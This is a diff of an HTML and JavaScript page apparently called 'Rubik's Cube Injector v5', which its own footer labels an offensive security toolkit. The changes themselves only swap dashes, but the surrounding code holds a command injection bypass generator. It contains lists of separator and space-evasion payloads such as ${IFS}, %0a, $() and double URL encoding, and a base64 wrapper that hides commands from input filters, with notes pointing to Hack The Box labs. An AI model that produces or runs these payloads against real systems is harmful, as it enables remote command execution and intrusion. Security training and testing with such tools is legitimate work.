@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Command injection bypass solver with OS-specific payloads, shell generators, and filter evasion techniques.">
     <meta name="theme-color" content="#020408">
-<title>Rubik's Cube Injector v5 — Full Solver</title>
+<title>Rubik's Cube Injector v5 - Full Solver</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -176,7 +176,7 @@ html, body {
   <!-- P4: RUBIK'S CUBE SOLVER -->
   <div class="sec" id="pg-solve">
     <h3 style="color:var(--green)">&#x1F9E9; Step 4: Rubik's Cube Command Solver</h3>
-    <p>Enter ANY command. The solver analyzes every character, identifies all problems, then generates multi-layer bypass strategies — like solving a Rubik's Cube face by face.</p>
+    <p>Enter ANY command. The solver analyzes every character, identifies all problems, then generates multi-layer bypass strategies - like solving a Rubik's Cube face by face.</p>
     <div id="solve-confirmed" style="margin:6px 0"></div>
     <div style="display:flex;gap:8px;margin:8px 0;flex-wrap:wrap;align-items:end">
       <div class="field" style="flex:1;min-width:250px"><label>Command to Inject</label>
@@ -214,7 +214,7 @@ html, body {
 <div class="toast" id="toast"></div>
 <script>
 /* ═══════════════════════════════════════════════════════════
-   ALL 15 DATABASES — 227 TECHNIQUES — chars[] ON EVERY ENTRY
+   ALL 15 DATABASES - 227 TECHNIQUES - chars[] ON EVERY ENTRY
    ═══════════════════════════════════════════════════════════ */
 var SEPARATORS=[{id:'semi',val:';',priority:5,contexts:['linux'],note:'Standard separator',chars:[';']},{id:'newline',val:'%0a',priority:1,contexts:['all'],note:'HTB: usually NOT blacklisted',chars:[]},{id:'cr',val:'%0d',priority:3,contexts:['all'],chars:[]},{id:'crlf',val:'%0d%0a',priority:3,contexts:['all'],chars:[]},{id:'pipe',val:'|',priority:4,contexts:['all'],chars:['|']},{id:'amp',val:'&',priority:5,contexts:['all'],chars:['&']},{id:'and',val:'&&',priority:6,contexts:['all'],chars:['&']},{id:'or',val:'||',priority:6,contexts:['all'],chars:['|']},{id:'backtick',val:'`',priority:7,contexts:['all'],inline:true,chars:['`']},{id:'subshell',val:'$()',priority:7,contexts:['all'],inline:true,chars:['$','(',')']},{id:'ls_colors',val:'${LS_COLORS:10:1}',priority:2,contexts:['linux'],note:'HTB: extracts ; from env',chars:['$','{','}']},{id:'dollar_brace',val:'${}',priority:8,contexts:['all'],chars:['$','{','}']},{id:'hash',val:'#',priority:9,contexts:['all'],note:'Comment truncation',chars:['#']},{id:'win_rem',val:'REM',priority:10,contexts:['windows'],chars:[]},{id:'win_colon',val:'::',priority:10,contexts:['windows'],chars:[]},{id:'sql_dash',val:'--',priority:11,contexts:['all'],chars:[]},{id:'c_comment',val:'/* */',priority:11,contexts:['all'],chars:['/']},{id:'null_byte',val:'%00',priority:12,contexts:['all'],chars:[]},{id:'hex_null',val:'\\x00',priority:12,contexts:['all'],chars:['\\']},{id:'raw_newline',val:'\\n',priority:2,contexts:['all'],chars:['\\']},{id:'raw_cr',val:'\\r',priority:3,contexts:['all'],chars:['\\']},{id:'raw_crlf',val:'\\r\\n',priority:3,contexts:['all'],chars:['\\']},{id:'double_semi',val:'%253b',priority:4,contexts:['all'],note:'Double URL encoded',chars:[]},{id:'double_newline',val:'%250a',priority:2,contexts:['all'],note:'Double URL encoded',chars:[]},{id:'double_pipe',val:'%257c',priority:5,contexts:['all'],chars:[]},{id:'double_amp',val:'%2526',priority:6,contexts:['all'],chars:[]}];
 var SPACE_BYPASSES=[{id:'literal',val:' ',priority:10,chars:[' ']},{id:'ifs',val:'${IFS}',priority:1,contexts:['linux'],note:'HTB: most reliable',chars:['$','{','}']},{id:'ifs_simple',val:'$IFS',priority:2,contexts:['linux'],chars:['$']},{id:'ifs9',val:'$IFS$9',priority:2,contexts:['bash'],chars:['$']},{id:'ifs_sub',val:'${IFS:0:1}',priority:3,contexts:['bash'],chars:['$','{','}']},{id:'ifs_pattern',val:'${IFS%%[a-z]*}',priority:4,contexts:['bash'],chars:['$','{','}']},{id:'tab',val:'%09',priority:1,contexts:['all'],note:'Cross-platform',chars:[]},{id:'newline_space',val:'%0a',priority:3,contexts:['all'],chars:[]},{id:'vtab',val:'%0b',priority:5,contexts:['all'],chars:[]},{id:'brace',val:'{a,b}',priority:1,contexts:['bash'],note:'HTB: eliminates spaces',special:'brace_expansion',chars:['{','}']},{id:'redirect',val:'<',priority:7,chars:['<']},{id:'ansi_c',val:"$'\\x20'",priority:4,contexts:['bash'],chars:['$',"'",'\\']},{id:'var_concat',val:'a=/path;cmd$a',priority:6,chars:[';','$']},{id:'tilde',val:'~',priority:8,contexts:['linux'],chars:['~']},{id:'unicode_nbsp',val:'%C2%A0',priority:9,chars:[]},{id:'unicode_em',val:'%E2%80%83',priority:9,chars:[]},{id:'win_substr',val:'%CommonProgramFiles:~10,-18%',priority:8,contexts:['windows'],chars:[]},{id:'random_null',val:'${RANDOM:0:0}',priority:6,contexts:['bash'],chars:['$','{','}']},{id:'undefined_var',val:'${Z}',priority:6,contexts:['bash'],chars:['$','{','}']},{id:'backslash_newline',val:'\\%0A',priority:5,chars:['\\']}];
@@ -420,7 +420,7 @@ function renderDiscover(dim){var tabs=document.getElementById('dim-tabs'),body=d
 }
 
 /* ═══════════════════════════════════════════════════════════
-   P4: RUBIK'S CUBE SOLVER — THE CORE ENGINE
+   P4: RUBIK'S CUBE SOLVER - THE CORE ENGINE
    ═══════════════════════════════════════════════════════════ */
 function renderSolveConfirmed(){var h='<div style="display:flex;gap:4px;flex-wrap:wrap">';
   var mk=function(lbl,arr){arr.forEach(function(t){h+='<span class="safe-tag prob-tag" style="border-color:var(--green);color:var(--green)">\u2705 '+lbl+': '+escH(t.id)+'</span>';});};
@@ -464,7 +464,7 @@ function solveCube(){
   // ─── STRATEGY A: BASE64 FULL-WRAP (hides ALL problem chars) ───
   var b64=safeB64(raw);
   var wrappers=[];
-  // bash<<<$(base64 -d<<<ENCODED) — uses $, (, ), < but NO pipe, NO space in command
+  // bash<<<$(base64 -d<<<ENCODED) - uses $, (, ), < but NO pipe, NO space in command
   // Apply space bypass to the wrapper's space between "base64" and "-d"
   var spOptions=spaces.length?spaces:filterCtx(SPACE_BYPASSES).filter(techOk).slice(0,5);
   if(!spOptions.length)spOptions=[{id:'%09',val:'%09'}];
@@ -508,7 +508,7 @@ function solveCube(){
     if(sl.id!=='literal')cmd=cmd.replace(/\//g,sl.val);
     // Replace pipes with workarounds if blocked
     if(isBlk('|')&&cmd.indexOf('|')>=0){
-      // Can't do direct char bypass for pipes — skip this combo
+      // Can't do direct char bypass for pipes - skip this combo
       return;
     }
     var full=sep.inline?(sep.id==='backtick'?base+'`'+cmd+'`':base+'$('+cmd+')'):base+sep.val+cmd;
@@ -629,7 +629,7 @@ qaCheck();renderCharmap();
 </script>
 
 <footer style="text-align:center;padding:1.5rem;border-top:1px solid var(--mah-border);color:var(--mah-text-secondary);font-size:0.75rem;font-family:'JetBrains Mono',monospace;margin-top:2rem;">
-  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta — Offensive Security Toolkit
+  Built with <span style="color:#f87171;">&hearts;</span> by Mahdiesta - Offensive Security Toolkit
 </footer>
 
 </body>
